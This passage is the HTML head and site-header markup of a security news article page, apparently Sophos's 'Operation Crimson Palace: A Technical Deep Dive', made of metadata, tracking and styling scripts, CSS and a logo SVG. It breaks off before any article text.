<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
	<link rel="alternate" hreflang="es-419" href="https://news.sophos.com/es-419/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="nl-nl" href="https://news.sophos.com/nl-nl/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="pt-br" href="https://news.sophos.com/pt-br/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="de-de" href="https://news.sophos.com/de-de/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="fr-fr" href="https://news.sophos.com/fr-fr/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="es-es" href="https://news.sophos.com/es-es/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="it-it" href="https://news.sophos.com/it-it/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="ja-jp" href="https://news.sophos.com/ja-jp/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
	<link rel="alternate" hreflang="zh-tw" href="https://news.sophos.com/zh-tw/2024/06/05/operation-crimson-palace-a-technical-deep-dive" />
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TW8W88B');</script>
<!-- End Google Tag Manager -->
<script type="text/javascript">
/* <![CDATA[ */
(()=>{var e={};e.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"==typeof window)return window}}(),function({ampUrl:n,isCustomizePreview:t,isAmpDevMode:r,noampQueryVarName:o,noampQueryVarValue:s,disabledStorageKey:i,mobileUserAgents:a,regexRegex:c}){if("undefined"==typeof sessionStorage)return;const d=new RegExp(c);if(!a.some((e=>{const n=e.match(d);return!(!n||!new RegExp(n[1],n[2]).test(navigator.userAgent))||navigator.userAgent.includes(e)})))return;e.g.addEventListener("DOMContentLoaded",(()=>{const e=document.getElementById("amp-mobile-version-switcher");if(!e)return;e.hidden=!1;const n=e.querySelector("a[href]");n&&n.addEventListener("click",(()=>{sessionStorage.removeItem(i)}))}));const g=r&&["paired-browsing-non-amp","paired-browsing-amp"].includes(window.name);if(sessionStorage.getItem(i)||t||g)return;const u=new URL(location.href),m=new URL(n);m.hash=u.hash,u.searchParams.has(o)&&s===u.searchParams.get(o)?sessionStorage.setItem(i,"1"):m.href!==u.href&&(window.stop(),location.replace(m.href))}({"ampUrl":"https:\/\/news.sophos.com\/en-us\/2024\/06\/05\/operation-crimson-palace-a-technical-deep-dive\/?amp=1","noampQueryVarName":"noamp","noampQueryVarValue":"mobile","disabledStorageKey":"amp_mobile_redirect_disabled","mobileUserAgents":["Mobile","Android","Silk\/","Kindle","BlackBerry","Opera Mini","Opera Mobi"],"regexRegex":"^\\\/((?:.|\\n)+)\\\/([i]*)$","isCustomizePreview":false,"isAmpDevMode":false})})();
/* ]]> */
</script>
<title>Operation Crimson Palace: A Technical Deep Dive &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//unpkg.com' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='all-css-2' href='https://news.sophos.com/wp-includes/css/dist/block-library/style.min.css?m=1729616464g' type='text/css' media='all' />
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<link rel='stylesheet' id='all-css-6' href='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzyrWz01NyUxMzUnNTc0rQeEU5CRWphbp5qSmJyZX6uVm5uklFxfr6OPTDpRD5sM02efaGpobWZoZmpmYmQIARN8u6g==' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='elasticpress-facet-style-inline-css'>
.widget_ep-facet input[type=search],.wp-block-elasticpress-facet input[type=search]{margin-bottom:1rem}.widget_ep-facet .searchable .inner,.wp-block-elasticpress-facet .searchable .inner{max-height:20em;overflow:scroll}.widget_ep-facet .term.hide,.wp-block-elasticpress-facet .term.hide{display:none}.widget_ep-facet .empty-term,.wp-block-elasticpress-facet .empty-term{opacity:.5;position:relative}.widget_ep-facet .empty-term:after,.wp-block-elasticpress-facet .empty-term:after{bottom:0;content:" ";display:block;left:0;position:absolute;right:0;top:0;width:100%;z-index:2}.widget_ep-facet .level-1,.wp-block-elasticpress-facet .level-1{padding-left:20px}.widget_ep-facet .level-2,.wp-block-elasticpress-facet .level-2{padding-left:40px}.widget_ep-facet .level-3,.wp-block-elasticpress-facet .level-3{padding-left:60px}.widget_ep-facet .level-4,.wp-block-elasticpress-facet .level-4{padding-left:5pc}.widget_ep-facet .level-5,.wp-block-elasticpress-facet .level-5{padding-left:75pt}.widget_ep-facet input[disabled],.wp-block-elasticpress-facet input[disabled]{cursor:pointer;opacity:1}.widget_ep-facet .term a,.wp-block-elasticpress-facet .term a{-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-ms-flexbox;display:flex;position:relative}.widget_ep-facet .term a:hover .ep-checkbox,.wp-block-elasticpress-facet .term a:hover .ep-checkbox{background-color:#ccc}.ep-checkbox{-webkit-box-align:center;-ms-flex-align:center;-ms-flex-negative:0;-webkit-box-pack:center;-ms-flex-pack:center;align-items:center;background-color:#eee;display:-webkit-box;display:-ms-flexbox;display:flex;flex-shrink:0;height:1em;justify-content:center;margin-right:.25em;width:1em}.ep-checkbox:after{border:solid #fff;border-width:0 .125em .125em 0;content:"";display:none;height:.5em;-webkit-transform:rotate(45deg);transform:rotate(45deg);width:.25em}.ep-checkbox.checked{background-color:#5e5e5e}.ep-checkbox.checked:after{display:block}

</style>
<link rel='stylesheet' id='all-css-18' href='https://news.sophos.com/wp-content/mu-plugins/search/elasticpress/dist/css/related-posts-block-styles.min.css?m=1728928671g' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='all-css-22' href='https://news.sophos.com/wp-content/themes/sophosnews-2017/style-2021.css?m=1722507790g' type='text/css' media='all' />
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraG5kaWZoZmJmWkWAK+eIic=" ></script><link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/955433" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/" />
<link rel='shortlink' href='https://news.sophos.com/?p=955433' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2024%2F06%2F05%2Foperation-crimson-palace-a-technical-deep-dive%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2024%2F06%2F05%2Foperation-crimson-palace-a-technical-deep-dive%2F&#038;format=xml" />
<link rel="me" href="https://infosec.exchange/@SophosXOps"/>
<link rel="alternate" type="text/html" media="only screen and (max-width: 640px)" href="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/?amp=1">	<style>img#wpstats{display:none}</style>
		<link rel="amphtml" href="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/?amp=1"><style>#amp-mobile-version-switcher{left:0;position:absolute;width:100%;z-index:100}#amp-mobile-version-switcher>a{background-color:#444;border:0;color:#eaeaea;display:block;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif;font-size:16px;font-weight:600;padding:15px 0;text-align:center;-webkit-text-decoration:none;text-decoration:none}#amp-mobile-version-switcher>a:active,#amp-mobile-version-switcher>a:focus,#amp-mobile-version-switcher>a:hover{-webkit-text-decoration:underline;text-decoration:underline}</style>
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Operation Crimson Palace: A Technical Deep Dive" />
<meta property="og:url" content="https://news.sophos.com/en-us/2024/06/05/operation-crimson-palace-a-technical-deep-dive/" />
<meta property="og:description" content="Sophos Managed Detection and Response initiated a threat hunt across all customers after the detection of abuse of a vulnerable legitimate VMware executable (vmnat.exe) to perform dynamic link libr…" />
<meta property="article:published_time" content="2024-06-05T10:00:46+00:00" />
<meta property="article:modified_time" content="2024-06-10T17:53:24+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="427" />
<meta property="og:image:alt" content="palace in china" />
<meta property="og:locale" content="en_US" />
<meta property="fb:admins" content="28552295016" />
<meta name="twitter:text:title" content="Operation Crimson Palace: A Technical Deep Dive" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2024/05/shutterstock_601044416.jpg?w=640" />
<meta name="twitter:image:alt" content="palace in china" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
		<style type="text/css" id="wp-custom-css">
			.entry-content .embed-vimeo iframe,
.entry-content .embed-youtube iframe {
  aspect-ratio: 16/9; width: 100%; height: auto;
}		</style>
		</head>

<body class="post-template-default single single-post postid-955433 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TW8W88B"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="sr-only" href="#content">Skip to content</a>

	
<header class="bg-blue-600" x-data="{ mobileMenu: false, searchField: false }">
	<div class="container">
		<div class="flex items-center justify-between h-16">

			<!-- Logo -->
			<div class="flex-shrink-0">
				<a class="site-logo" href="https://news.sophos.com/en-us/" rel="home">
				<svg width="172" height="17" xmlns="http://www.w3.org/2000/svg">
					<g fill="#FFF" fill-rule="evenodd">
						<path d="M113.024 5.298V16.74h-2.595V.259h2.265l7.997 11.49V.26h2.619v16.482h-2.289l-7.997-11.443M126.064.259h10.78v2.307H128.8v4.521h7.549v2.214h-7.55v5.133h8.376v2.307h-11.111V.259M138.478.259h2.855l2.694 12.29L147.29.26h2.783l3.61 12.314L156.005.26h2.783l-3.62 16.482h-2.76l-3.751-12.126-3.426 12.126h-2.784L138.478.259M168.933 4.968v-.283c0-1.318-.778-2.425-3.492-2.425-2.43 0-3.279 1.013-3.279 2.284 0 1.201.708 1.743 2.218 2.073l3.491.776c2.123.448 4.129 1.602 4.129 4.333 0 3.014-1.675 5.274-6.204 5.274-5.214 0-6.559-2.26-6.559-4.52v-.307h2.737v.26c0 1.2.755 2.284 3.774 2.284 2.5 0 3.421-1.084 3.421-2.638 0-1.224-.731-1.907-2.289-2.237l-3.49-.777c-2.407-.517-3.917-1.742-3.917-4.309 0-2.566 1.77-4.756 6.016-4.756 4.553 0 6.18 2.26 6.18 4.639v.33h-2.736M85.303 16.718h8.88c2.492 0 3.549-.15 4.379-.677 1.308-.803 2.139-2.378 2.139-4.162 0-1.457-.504-2.868-1.258-3.622-.981-1.006-2.316-1.382-4.783-1.382h-2.693c-1.208 0-2.097-.05-2.6-.276-.605-.277-.956-.81-.956-1.562 0-.88.427-1.455 1.132-1.632.529-.124 1.14-.124 2.726-.15h7.949V.265h-8.754c-1.963 0-2.843.075-3.598.353-1.737.602-2.921 2.383-2.921 4.518 0 1.458.58 2.745 1.587 3.624.881.753 2.189 1.105 4.202 1.105h3.584c.805 0 1.46.1 1.813.3.678.327 1.08.934 1.08 1.714 0 .652-.301 1.122-.83 1.447-.426.278-1.158.403-2.49.403h-8.588v2.99zm-84.945 0h8.88c2.492 0 3.549-.15 4.38-.677 1.307-.803 2.138-2.378 2.138-4.162 0-1.457-.504-2.868-1.258-3.622-.982-1.006-2.316-1.382-4.783-1.382H7.023c-1.209 0-2.098-.05-2.6-.276-.605-.277-.957-.81-.957-1.562 0-.88.427-1.455 1.132-1.632.53-.124 1.141-.124 2.726-.15h7.95V.265H6.52c-1.964 0-2.844.075-3.6.353C1.185 1.22 0 3 0 5.136 0 6.594.582 7.881 1.587 8.76c.881.753 2.19 1.105 4.203 1.105h3.582c.807 0 1.46.1 1.814.3.678.327 1.08.934 1.08 1.714 0 .652-.3 1.122-.83 1.447-.426.278-1.157.403-2.49.403H.358v2.99zM71.99 4.596c-.52.813-.765 2.118-.765 3.87 0 3.845 1.331 5.595 4.294 5.595 2.915 0 4.248-1.75 4.248-5.546 0-3.847-1.308-5.571-4.248-5.571-1.604 0-2.864.592-3.53 1.652zm10.05-1.897c1.013 1.33 1.58 3.498 1.58 6.039 0 2.882-.914 5.249-2.544 6.555-1.233.986-3.11 1.528-5.335 1.528-3.16 0-5.654-1.037-6.937-2.884-.964-1.355-1.435-3.155-1.435-5.35 0-3.152.866-5.544 